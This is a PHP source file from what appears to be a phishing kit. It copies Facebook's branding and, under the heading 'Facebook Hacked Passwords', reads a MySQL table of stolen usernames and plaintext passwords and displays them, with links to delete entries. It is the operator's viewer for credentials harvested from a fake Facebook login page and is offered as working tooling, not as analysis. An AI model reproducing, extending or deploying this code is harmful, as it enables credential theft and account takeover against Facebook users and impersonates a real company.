<?php session_start(); ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Welcome to Facebook</title>
        <link rel="SHORTCUT ICON" href="images/facebook1.png">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <meta name="description" content="Fancy Sliding Form with jQuery" />
        <meta name="keywords" content="jquery, form, sliding, usability, css3, validation, javascript"/>
        <link rel="stylesheet" href="css/style2.css" type="text/css" media="screen"/>
    </head>
    <style>
		a:link {color:#3b5998; text-decoration:none}
		a:visited {color:#3b5998;}
		a:hover{ text-decoration:underline; color:#3b5998;}
		a:active {color:#3b5998;text-decoration: none}
		
		#bluebar
		{
		background-color:#3b5998;
		height:80px;
		width:100%;
		-moz-box-shadow:0px 0px 1px #052467;
		-webkit-box-shadow:0px 0px 1px #052467; 
		box-shadow:0px 0px 1px #052467;
		position:static; padding:0px;
		border-bottom:1px solid #1d4088;
		}
		#bluewrapper
		{
		
		width:1022px;
		height:80px;
		}
		#logo
		{
		position:absolute;
		margin-top:25px;
		position:absolute;
		}
		#sidebar
		{
		font-family:Tahoma, Geneva, sans-serif;
		font-size:12px;
		margin-top:70px;
		width:600px;
		height:auto;
		border: 1px solid #ccc;
		padding:20px;
		border-radius: 5px;
		-moz-border-radius: 5px;
		-webkit-border-radius: 5px;
		text-align:left;
		}
		#ladynilan
		{
		font-family:Tahoma, Geneva, sans-serif;
		border-collapse:collapse;
		margin:0px;
		width:100%;
		}
		#ladynilan td, #ladynilan th 
		{
		font-size:11px;
		border:1px solid #044476;
		padding:3px 7px 2px 7px;
		background-color:#ffffff;
		color:#003471;
		font-family:Tahoma, Geneva, sans-serif;
		}
		#ladynilan th 
		{
		font-size:14px;
		text-align:left;
		padding-top:5px;
		padding-bottom:4px;
		background-color:#044476;
		color:#ffffff;
		}
    </style>
    <body bgcolor="#fff">
    
       <div id="bluebar">
       <center>
       	<div id="bluewrapper">
    	<div id="logo"><a href="http://www.facebook.com/"><img src="images/logo.jpg" draggable="false"></a><a href="https://www.facebook.com/r.php?locale=en_US"><img src="images/juju.jpg" draggable="false" style="padding-bottom:5px;"></a></div>
        </div>
       </center>
       </div>
       </center>
       </div>
        <div id="content">
        <center>
        <div id="wrapper">
        
        <div id="sidebar">
        <b style="color:#000; font-size:16px;">Facebook Hacked Passwords</b>
        <br><br>
        <hr width="100%">
        <br>
         <?php
	if(isset($_SESSION['DELETE'])){
	echo '<div style="background-color:#ffebe8; border:1px solid #dd3c10; padding:15px; color:#000; border-radius: 0px;">';
	echo $_SESSION['DELETE']; 
	unset($_SESSION['DELETE']);
	echo '</div>';
	}?>
    <br>
     <?php
	//databse connection
	include_once 'config.php';

	//Connect to mysql server
	$link = mysql_connect(DB_HOST, DB_USER, DB_PASSWORD);
	if(!$link) {
		die('Failed to connect to server: ' . mysql_error());
	}
	
	//Select database
	$db = mysql_select_db(DB_DATABASE);
	if(!$db) {
		die("Unable to select database");
	}
	
	//Create query
	$row="SELECT * FROM datas order by id";
	$result=mysql_query($row);

echo "<table id='ladynilan'>";
echo "<th>ID</th>";
echo "<th>USERNAME</th>";
echo "<th>PASSWORD</th>";
echo "<th>DELETE</th>";
echo "<tr>";
while($row = mysql_fetch_array($result))
  { 
echo "<td>".$row[0]."</td>";
echo "<td>".$row[1]."</td>";
echo "<td>".$row[2]."</td>";
echo '<td><a href="delete-passwords.php?id='.$row[0].'" onclick="return confirm(\'Delete '.$row[0].'?\');"><img src="images/fancy_close.png"></a></td>';

echo "</tr>";
  }
  echo "</table>";
mysql_close($link);
?>
<br>
<p align="right"><a href="http://www.facebook.com"><b><i>Log in here</i></b></a></p>
        </div>
       
        </div>
        </center>
        </div>
        <center>

    <div  style="display: inline-block; font-size:10.5px; color:#8f808f; padding-bottom:8px; margin-top:10px;">Facebook &copy; 2013 &middot; <a href="#">English(US)</a></div>
    <div align="right" style="display: inline-block; font-size:10.5px; color:#3b5998; padding-left:305px;"><a href="">About</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Create an Ad</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Create a Page</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Developers</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Careers</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Privacy</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Cookies</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Terms</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="">Help</a></div>
</div>
</div>
</center>
    </body>
</html>